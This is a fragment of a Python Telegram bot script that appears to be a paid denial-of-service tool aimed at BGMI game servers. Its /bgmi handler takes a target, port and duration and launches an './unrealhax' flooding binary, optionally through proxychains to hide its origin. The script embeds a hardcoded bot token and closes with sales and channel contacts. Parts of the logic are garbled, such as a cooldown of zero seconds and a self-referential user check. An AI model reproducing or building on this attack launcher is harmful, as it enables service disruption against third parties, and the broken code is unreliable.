...
bot = telebot.TeleBot('7791324941:AAETf63HFg81PCgrsutDQauvjbJ07g8HIls')
...
def handle_bgmi(message):
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in user_id:
            ...
            response = "𝐘𝐨𝐮 𝐚𝐫𝐞 𝐨𝐧 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧.\n𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 0 𝐒𝐞𝐜𝐨𝐧𝐝 𝐛𝐞𝐟𝐨𝐫𝐞 𝐫𝐮𝐧𝐧𝐢𝐧𝐠 𝐭𝐡𝐞 /bgmi 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐚𝐠𝐚𝐢𝐧"
            bot.reply_to(message, response)
            return
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 240:
                ...
                if proxy:
                    full_command = f"proxychains4 -q ./unrealhax {target} {port} {time} 1000"
                    os.environ['PROXYCHAINS_PROXY'] = proxy
                else:
                    full_command = f"./unrealhax {target} {port} {time} 1000"
...
🛒 𝐁𝐮𝐲 𝐅𝐫𝐨𝐦 :-\n𝟏.@SHARP_X_OWNER\n
🏫𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 :- https://t.me/+GyFEB9f16KJkZjQ1
'''
